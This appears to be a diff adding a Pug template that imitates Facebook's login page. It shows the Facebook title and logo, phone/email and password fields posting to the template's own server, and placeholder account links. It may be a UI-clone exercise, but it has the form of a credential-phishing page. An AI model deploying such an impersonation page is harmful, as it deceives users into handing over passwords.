@@ -1,0 +1,22 @@
+doctype html 
+html  
+  head 
+    title facebook 
+    style 
+      include ../static/style.css    
+  body 
+    .box 
+      img(src="/static/images/fbbimg.png", alt="")
+      form(action="/", method="post", class="Input") 
+        input(type="text" name="phone" placeholder="Phone or email")
+        input(type="password" name="password" placeholder="Password")
+        button 
+          | Log In 
+      .forgot 
+        a(href="") Forgot Password?
+      .or 
+        p OR 
+      .new 
+        button 
+          a(href="") Create new Facebook account  
+      
